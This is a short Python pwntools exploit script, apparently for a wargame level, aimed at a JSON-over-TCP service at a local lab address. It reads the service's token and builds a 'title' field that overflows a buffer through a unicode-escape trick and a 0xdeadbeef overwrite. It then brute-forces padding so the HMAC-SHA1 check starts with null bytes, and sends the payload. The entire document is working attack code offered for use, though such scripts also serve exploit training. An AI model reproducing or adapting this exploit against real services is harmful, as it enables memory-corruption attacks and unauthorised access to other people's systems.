#!/usr/bin/python
from pwn import *
from hashlib import sha1
import hmac

# Get the HMAC to start with 2 NULL bytes
def getPadding(key, params):
    
    print "[#] Trying to bruteforce HMAC"

    padding = 0
    
    while True:

        request = token + "\n" + params + ', "padding": "' + str(padding) + '" }'

        mac = hmac.new(token, request + "\n", sha1).digest().encode("hex")
        
        if("0000" == mac[0:4]):
            break

        padding += 1

    print "[#] Found HMAC: {}".format(mac)

    return request


s = remote("192.168.159.130", 20003)

# Getting the token
token = s.recv(1024).split('"')[1]
print "[#] Token: {}".format(token)

# Need to the send the token with the payload
payload = ""

# The token
payload += token


# Padding
padding = "A"*31
padding += p32(0xdeadbeef)

# Payload
payload += '{ "tags": [ "AAAA", "BBBB" ], "title": "' + "A"*127 + "\\\\u4141" + padding + '", "contents": "DDDD", "serverip": "127.0.0.1" }'

# Inserting the padding
payload = getPadding(token, payload[len(token):-2])


print "[#] Payload: {}".format(payload)
s.sendline(payload)

s.close()